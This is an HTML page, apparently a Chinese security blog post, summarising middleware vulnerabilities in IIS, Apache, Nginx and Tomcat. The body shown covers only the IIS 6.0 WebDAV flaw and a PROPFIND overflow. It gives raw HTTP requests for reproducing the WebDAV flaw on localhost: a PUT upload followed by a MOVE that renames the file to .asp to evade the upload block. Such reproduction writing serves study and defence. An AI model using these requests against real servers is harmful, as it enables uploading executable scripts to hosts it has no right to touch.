@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>中间件漏洞 | Hexo</title>
+  <meta name="description" content="中间件漏洞总结IISPUT漏洞最初是Windows NT版本的可选包，随后内置在Windows 2000、Windows XP Professional和Windows Server 2003一起发行，但在Windows XP Home版本上并没有IIS。 IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和">
+<meta property="og:type" content="article">
+<meta property="og:title" content="中间件漏洞">
+<meta property="og:url" content="http://s1eady.top/2019/05/02/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="中间件漏洞总结IISPUT漏洞最初是Windows NT版本的可选包，随后内置在Windows 2000、Windows XP Professional和Windows Server 2003一起发行，但在Windows XP Home版本上并没有IIS。 IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/25A99970-DF7A-4DB1-9CFA-8A634944B783.png">
+<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/8B77F3C7-DC39-48C0-99C5-4CC7B1C123AC.png">
+<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200930141720152.png">
+<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200930152555870.png">
+<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200930152001965.png">
+<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200611151016949.png">
+<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200611151044485.png">
+<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200612145955946.png">
+<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200612150021877.png">
+<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/1.png">
+<meta property="article:published_time" content="2019-05-02T01:21:46.000Z">
+<meta property="article:modified_time" content="2020-10-26T02:22:47.658Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="组件安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/25A99970-DF7A-4DB1-9CFA-8A634944B783.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://s1eady.top/2019/05/02/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/cofess" target="_blank">
+          <img class="img-circle img-rotate" src="/images/1.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">果冻</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Penetration Testing</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> 中国 南京</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="/GXA111666" target="_blank" title="VX" data-toggle=tooltip data-placement=top><i class="icon icon-VX"></i></a></li>
+        
+        <li><a href="/1252195810" target="_blank" title="QQ" data-toggle=tooltip data-placement=top><i class="icon icon-QQ"></i></a></li>
+        
+        <li><a href="/1252195810@qq.com" target="_blank" title="E-Mail" data-toggle=tooltip data-placement=top><i class="icon icon-E-mail"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>深山夕照深秋雨 一往情深深几许</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+  </div>
+</aside>
+
+  
+  
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">文章目录</h3>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">中间件漏洞总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IIS"><span class="toc-number">1.1.</span> <span class="toc-text">IIS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PUT%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.1.</span> <span class="toc-text">PUT漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%E5%8F%8A%E6%88%90%E5%9B%A0"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">漏洞介绍及成因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%89%8D%E6%8F%90"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">漏洞前提</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E7%8C%9C%E8%A7%A3"><span class="toc-number">1.1.2.</span> <span class="toc-text">短文件名猜解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.3.</span> <span class="toc-text">远程代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%E5%8F%8A%E6%88%90%E5%9B%A0-1"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">漏洞介绍及成因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.4.</span> <span class="toc-text">解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%E5%8F%8A%E6%88%90%E5%9B%A0-2"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">漏洞介绍及成因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%89%8D%E6%8F%901"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">漏洞前提1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B01"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">漏洞复现1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%89%8D%E6%8F%902"><span class="toc-number">1.1.4.4.</span> <span class="toc-text">漏洞前提2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B02"><span class="toc-number">1.1.4.5.</span> <span class="toc-text">漏洞复现2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.1.4.6.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache"><span class="toc-number">1.2.</span> <span class="toc-text">Apache</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#apache%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.2.1.</span> <span class="toc-text">apache学习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#apache%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">apache配置文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#apache%E4%B8%8Ephp%E7%9A%84%E7%BB%93%E5%90%88"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">apache与php的结合</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#apache%E7%9A%84%E9%85%8D%E7%BD%AE%E6%8C%87%E4%BB%A4"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">apache的配置指令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#lt-Directory-gt-%E6%8C%87%E4%BB%A4"><span class="toc-number">1.2.1.3.1.</span> <span class="toc-text">&lt;Directory&gt;指令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#lt-Files-gt-%E6%8C%87%E4%BB%A4"><span class="toc-number">1.2.1.3.2.</span> <span class="toc-text">&lt;Files&gt;指令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#lt-FilesMatch-gt-%E6%8C%87%E4%BB%A4"><span class="toc-number">1.2.1.3.3.</span> <span class="toc-text">&lt;FilesMatch&gt;指令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#lt-Location-gt-%E6%8C%87%E4%BB%A4"><span class="toc-number">1.2.1.3.4.</span> <span class="toc-text">&lt;Location&gt;指令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#lt-LocationMatch-gt-%E6%8C%87%E4%BB%A4"><span class="toc-number">1.2.1.3.5.</span> <span class="toc-text">&lt;LocationMatch&gt;指令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SetHandler%E6%8C%87%E4%BB%A4"><span class="toc-number">1.2.1.3.6.</span> <span class="toc-text">SetHandler指令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AddType"><span class="toc-number">1.2.1.3.7.</span> <span class="toc-text">AddType</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AddHandle"><span class="toc-number">1.2.1.3.8.</span> <span class="toc-text">AddHandle</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%E5%8F%8A%E6%88%90%E5%9B%A0-3"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">漏洞介绍及成因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache%E7%9A%84-htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">Apache的.htaccess利用技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8%E8%8C%83%E5%9B%B4"><span class="toc-number">1.2.2.2.0.1.</span> <span class="toc-text">作用范围</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.2.2.0.2.</span> <span class="toc-text">配置方式</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-number">1.2.2.2.0.3.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.3.</span> <span class="toc-text">目录遍历漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%E5%8F%8A%E6%88%90%E5%9B%A0-4"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">漏洞介绍及成因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nginx"><span class="toc-number">1.3.</span> <span class="toc-text">Nginx</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nginx%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.3.1.</span> <span class="toc-text">Nginx学习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nginx%E6%98%AF%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90php%E7%9A%84"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">nginx是如何解析php的?</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CGI%E3%80%81fast-cgi"><span class="toc-number">1.3.1.1.1.</span> <span class="toc-text">CGI、fast-cgi</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#nginx%E4%B8%8Ephp-fpm"><span class="toc-number">1.3.1.1.2.</span> <span class="toc-text">nginx与php-fpm</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.1.1.3.</span> <span class="toc-text">常规流程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nginx%E7%9A%84pathinfo%E9%85%8D%E7%BD%AE"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">nginx的pathinfo配置</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-php-%E7%9A%84-cgi-fix-pathinfo-%E5%8A%9F%E8%83%BD"><span class="toc-number">1.3.1.2.1.</span> <span class="toc-text">使用 php 的 cgi.fix_pathinfo 功能</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FAST-CGI%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.2.</span> <span class="toc-text">FAST-CGI解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%E5%8F%8A%E6%88%90%E5%9B%A0-5"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">漏洞介绍及成因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat"><span class="toc-number">1.4.</span> <span class="toc-text">Tomcat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.4.1.</span> <span class="toc-text">Tomcat学习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Tomcat%E4%B8%8EServlet"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">Tomcat与Servlet</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Tomcat-1"><span class="toc-number">1.4.1.1.1.</span> <span class="toc-text">Tomcat</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-number">1.4.1.1.1.1.</span> <span class="toc-text">目录结构</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Tomcat%E5%8F%91%E5%B8%83%E9%A1%B9%E7%9B%AE"><span class="toc-number">1.4.1.1.1.2.</span> <span class="toc-text">Tomcat发布项目</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Tomcat%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95"><span class="toc-number">1.4.1.1.1.3.</span> <span class="toc-text">Tomcat敏感目录</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#tomcat-users-xml-%E7%94%A8%E6%88%B7%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.1.1.1.4.</span> <span class="toc-text">tomcat-users.xml 用户配置文件</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#servlet"><span class="toc-number">1.4.1.1.2.</span> <span class="toc-text">servlet</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#tomcat%E5%92%8Cservlet%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">1.4.1.1.2.1.</span> <span class="toc-text">tomcat和servlet的关系</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#web-xml%E4%B8%ADservlet%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%85%B6%E5%90%AB%E4%B9%89"><span class="toc-number">1.4.1.1.2.2.</span> <span class="toc-text">web.xml中servlet配置及其含义</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2017-12615"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">CVE-2017-12615</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.2.1.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-number">1.4.2.1.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.2.1.3.</span> <span class="toc-text">绕过方式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.2.1.4.</span> <span class="toc-text">防御方式</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-1938"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">CVE-2020-1938</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Web%E7%9B%AE%E5%BD%95%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.2.2.1.</span> <span class="toc-text">Web目录任意文件读取漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.4.2.2.2.</span> <span class="toc-text">任意命令执行</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">弱口令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E8%8C%83%E5%9B%B4%EF%BC%9A"><span class="toc-number">1.4.2.3.1.</span> <span class="toc-text">版本范围：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.4.2.3.2.</span> <span class="toc-text">漏洞原理：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#war%E5%88%B6%E4%BD%9C"><span class="toc-number">1.4.2.3.3.</span> <span class="toc-text">war制作</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-中间件漏洞总结" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      中间件漏洞
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2019/05/02/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="article-date">
+	  <time datetime="2019-05-02T01:21:46.000Z" itemprop="datePublished">2019-05-02</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/">组件安全</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/" rel="tag">组件安全</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2019/05/02/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="中间件漏洞总结"><a href="#中间件漏洞总结" class="headerlink" title="中间件漏洞总结"></a>中间件漏洞总结</h1><h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><h3 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h3><p>最初是Windows NT版本的可选包，随后内置在Windows 2000、Windows XP Professional和Windows Server 2003一起发行，但在Windows XP Home版本上并没有IIS。</p>
+<p>IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p>
+<h4 id="漏洞介绍及成因"><a href="#漏洞介绍及成因" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h4><p>IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。</p>
+<p>版本：IIS6.0</p>
+<h4 id="漏洞前提"><a href="#漏洞前提" class="headerlink" title="漏洞前提"></a>漏洞前提</h4><p>IIS 6.0开启了WebDAV并且拥有IIS来宾用户拥有写入权限，并且知道网站根目录。</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>1）开启WebDAV 和写权限</p>
+<p>2）利用burp测试</p>
+<ul>
+<li><p>抓包，将GET请求改为OPTIONS。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">options 请求属于浏览器的预检请求，查看服务器是否接受请求，预检通过后，浏览器才会去发 get， post， put， delete 等请求。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用PUT上传一个txt文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUT /test.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Content-Length:<span class="number">27</span></span><br><span class="line"></span><br><span class="line">steady <span class="keyword">is</span> very cool</span><br></pre></td></tr></table></figure>
+
+<p>成功上传。</p>
+</li>
+<li><p>用PUT上传一个ASP文件，这时候是禁止上传ASP文件</p>
+</li>
+<li><p>使用MOVE请求方法，并利用刚刚上传的上去的test.txt，修改文件后缀。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;test.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Destination: http:&#x2F;&#x2F;127.0.0.1&#x2F;aaa.asp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOVE方式 将指定的资源移动到Destination消息头指定的位置</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="短文件名猜解"><a href="#短文件名猜解" class="headerlink" title="短文件名猜解"></a>短文件名猜解</h3><h3 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h3><h4 id="漏洞介绍及成因-1"><a href="#漏洞介绍及成因-1" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h4><p>在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。</p>
+<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>利用poc</p>
